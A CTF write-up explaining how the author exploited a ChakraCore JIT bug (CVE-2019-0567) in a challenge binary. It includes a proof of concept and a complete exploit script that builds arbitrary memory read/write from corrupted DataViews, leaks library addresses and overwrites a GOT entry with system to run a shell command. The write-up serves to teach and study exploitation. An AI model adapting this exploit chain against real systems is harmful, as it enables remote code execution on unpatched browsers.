---
title: Trend Micro CTF 2019 libChakraCore.so
date: '2019-09-09'
lastmod: '2019-09-09T22:49:17+02:00'
categories:
- writeup
tags:
- pwn
- jit
- browser
- chakracore
authors:
- chq-matteo
---

If you already know the details of this challenge and bug, you can skip to the `Exploit` section

Due to all the materials published about Javascript engines exploitation, recently I have been trying more browser exploitation challenges.

## The challenge

We are given two binaries

1. ch - which takes a null terminated javascript source file from stdin, writes it into a tmp directory and then executes it
2. libChakraCore.so - a compiled version of [ChakraCore](https://github.com/microsoft/ChakraCore), a javascript engine from Microsoft

We are also given a .diff file

```diff
diff --git a/lib/Backend/GlobOptFields.cpp b/lib/Backend/GlobOptFields.cpp
index 88bf72d32..6fcb61151 100644
--- a/lib/Backend/GlobOptFields.cpp
+++ b/lib/Backend/GlobOptFields.cpp
@@ -564,7 +564,7 @@ GlobOpt::ProcessFieldKills(IR::Instr *instr, BVSparse<JitArenaAllocator> *bv, bo
         break;

     case Js::OpCode::InitClass:
-    case Js::OpCode::InitProto:
+    //case Js::OpCode::InitProto:
     case Js::OpCode::NewScObjectNoCtor:
     case Js::OpCode::NewScObjectNoCtorFull:
         if (inGlobOpt)
```

So the organizers have disabled a case in a function called ProcessFieldKills

## The bug

Searching for Chakra InitProto on google we can find several CVE.
One of them is CVE-2019-0567 reported by lokihardt from Google Security who is also the author of this PoC

```javascript

PoC for InitProto:

function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, 0x1234); // <-- This value is used as a pointer

    print(o.a);
}

main();
```

If you feed the PoC into the challenge binary you'll get a SegFault before the print function terminates when libChakraCore.so tries to access [rax] with rax = 0x100...1234

(the 0x1 is used to differentiate numbers from pointers)

lokihardt explains that if we set `proto` as the prototype of `tmp`, `proto`'s layout in memory changes.

The jit compiler didn't take this side effect into account at the time.

The challenge is basically a revert of the fixes that Microsoft applied.

## Useful Reading

So to understand this issue a little bit better I read some general ChakraCore exploitation material such as

- [Bruno Keith Presentation on the subject](https://github.com/bkth/Attacking-Edge-Through-the-JavaScript-Compiler)

And also some specific analysis of this bug and two very similar bugs also discovered by lokihardt (basically corresponding to the other 3 cases that were not commented out)

It happens that for CVE-2019-0539 there are two nice blog posts from Perception Point

1. [CVE-2019-0539 root cause analysis](https://perception-point.io/resources/research/cve-2019-0539-root-cause-analysis/)
2. [CVE-2019-0539 exploitation](https://perception-point.io/resources/research/cve-2019-0539-exploitation/)

CVE-2019-0539 is a sibling bug of the one in the challenge, specifically the InitClass case I think

## Summary

```
// chqmatteo: This diagram is borrowed from Perception Point (a similar diagram is in Bruno Keith slides)
// Memory layout of DynamicObject can be one of the following:
//        (#1)                (#2)                (#3)
//  +--------------+    +--------------+    +--------------+
//  | vtable, etc. |    | vtable, etc. |    | vtable, etc. |
//  |--------------|    |--------------|    |--------------|
//  | auxSlots     |    | auxSlots     |    | inline slots |
//  | union        |    | union        |    |              |
//  +--------------+    |--------------|    |              |
//                      | inline slots |    |              |
//                      +--------------+    +--------------+
// The allocation size of inline slots is variable and dependent on profile data for the
// object. The offset of the inline slots is managed by DynamicTypeHandler.
```

At the start, argument `proto` in `opt(o, proto, value)` has memory layout #3, setting it as a prototype makes it transition to layout #1

(in the different bug discussed by Bruno Keith, the transition is #3 -> #2 so there are some differences wrt offsets)

When `opt` gets jit compiled, the line `o.a = value;` is translated to a copy of `value` into the first inline slot of `o`, because for 2000 calls the layout in memory of `o` didn't change from layout #1

The actual bug is that the logic to bail out from the optimizations when `o`'s memory layout actually changes is not present in the jit compiled code.

That's why, when we finally call `opt` with `{a:1, b:2}` as both `o` and `proto`, we can write anything we want into the now `auxSlots` field of `o` (previously the first inline slot of `o`)

### Turning this into arbitraty address read write

To turn this bug into an arbitrary address read write is a bit involved, the gist is that we have to use an object as a stepping stone to corrupt the metadata of two ArrayBuffers (called `target` and `hax` in Bruno Keith slides, `dv1` and `dv2` in Perception Point post)

The first ArrayBuffer is used to change the `buffer` pointer of the second ArrayBuffer. The `buffer` is the pointer to where the values of an array are actually stored.

The second ArrayBuffer is used to read from or write into the address that we want.

You can refer to the slides and the second blog post for a more detailed explaination.

## Exploit

I'll divide the exploit in three parts (Setup, Arbitrary address read and write, Code Execution) and explain a bit what each stage does

## Setup

We first setup the four objects that we need `o`, `obj`, `dv1`, `dv2`. I'll use Perception Point terminology because they included a PoC exploit which can be adapted to this bug

You can diff the two scripts to get the differences

```javascript
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));

BASE = 0x100000000;

function hex(x) {
    return "0x" + x.toString(16);
}

function opt(o, c, value) {
    o.b = 1;

    let temp = {__proto__: c};

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj); // o->auxSlots = obj (Step 1)

    /*
      chqmatteo: so we set o.c but it can be any name you want,
      it's just the third property of o
      so it will get written to o->auxSlots[2]
      similary obj.h is the 8th property of obj so we will write to obj->auxSlots[7]
      and buffer is at that offset
     */
    o.c = dv1; // obj->auxSlots = dv1 (Step 2)
    obj.h = dv2; // dv1->buffer = dv2 (Step 3)

```

## Arbitrary address read and write

Here we set `dv1->buffer` to any address that we need

```javascript
    let read64 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        // chqmatteo: 0x38 = 7 * 8, we are writing at ((void*)dv1->buffer)[7] which is dv2->buffer
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // read from addr (Step 5)
        return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
    }
    let read3232 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // read from addr (Step 5)
        return [dv2.getInt32(0, true), dv2.getInt32(4, true)];
    }

    let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // write to addr (Step 5)
        dv2.setInt32(0, value_lo, true);
        dv2.setInt32(4, value_hi, true);
    }

    // chqmatteo: the first value of the object is the pointer to the vtable
    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);
    print(hex(vtable_lo + vtable_hi * BASE));

    // chqmatteo: demonstrate arbitrary read
    print(hex(read64(vtable_lo, vtable_hi)));
```

This is basically where Perception Point blog post ends

## Code execution

Now we can:

1. read and write any address we want using from `dv2`
2. plus we can read and write everything in the metadata of `dv2` using `dv1`.

One thing that is useful from the metadata of `dv2` is the `vtable` pointer.

The `vtable` pointer points to an address inside libChakraCore.so.
That is we can compute the base address of the library leaking the vtable pointer and reading from that address.

One common technique to gain code execution from arbitrary write is to write the address of `system` or `one_gadget` into a got entry of the binary

From the base address of libChakraCore.so we can compute the address of the got section and from there we can leak the base address of libc

Since the got of libChakraCore.so is writable I tried with various offsets, but without success.

So after a couple of failed tries, I searched for how to trigger calls to standard library from a javascript context and found this writeup

[https://bruce30262.github.io/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/](https://bruce30262.github.io/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/)

Looked for `got` in the writeup and found that you can trigger `memmove` with `some_array.set(other_array)`

The nice thing of `memmove` is that the first argument is a string and is the destination buffer of the memory move, so we can control the first argument of system
So I overwrote the corresponding entry in got with the address of system.

```javascript
    // compute some useful offsets, just try them all until it works
    let gdb_base = 0xc3a52000; // libChakraCore.so base addr in gdb

    let vptr_off = 0xc48566e0 - gdb_base;
    let chackra_base_lo = vtable_lo - vptr_off;

    let malloc_got = 0xc48a56e0 - gdb_base;
    // write targets
    let free_got = 0xc48a5128 - gdb_base
    let memmove = free_got - 0x128 + 0x108
    let memset = free_got - 0x128 + 0x248

    let one_gadget = 0x4f440; // actually it's system because the one gadgets that I tried didn't work

    print(hex(chackra_base_lo + vtable_hi * BASE));
    print('malloc and free')
    // get libc offsets to find libc version
    print(hex(read64(chackra_base_lo + malloc_got, vtable_hi)));
    print(hex(read64(chackra_base_lo + free_got, vtable_hi)));

    // read got to get libc base addr
    let libc = read3232(chackra_base_lo + free_got, vtable_hi);
    let free_off = 0x8dbce950 - 0x8db37000 // lost the gdb session so new base addr
    let libc_low = libc[0] - free_off;
    let libc_high = libc[1];
    print(hex(libc_low + libc_high * BASE))
    print('Writing on got');

    write64(chackra_base_lo + memmove, vtable_hi, libc_low + one_gadget, libc_high);
    // write64(chackra_base_lo + memset, vtable_hi, libc_low + one_gadget, libc_high);
    print('there');

    // just a random size and name, you can put different values if you want
    let ab = new Uint8Array(0x1020);
    let ef = new Uint8Array(0x1020);
    let cmd = 'cat flag'
    for (let i = 0; i < 1000; i++) {
        ab[i] = 100 - i;
        ef[i] = cmd.charCodeAt(i);
    }
    ef[cmd.length] = 0;

    // easier to spot in the debugger
    ab[0] = 0x41
    ab[1] = 0x41
    ab[2] = 0x41
    ab[3] = 0x41
    ab[4] = 0;

    // triggers memmove when copying ef.buffer <- ab.buffer
    ef.set(ab);

    // write on *0x0, crash the binary, poor man's breakpoint
    write64(0x0, 0x0, libc_low + one_gadget, libc_high);

}

main();
```
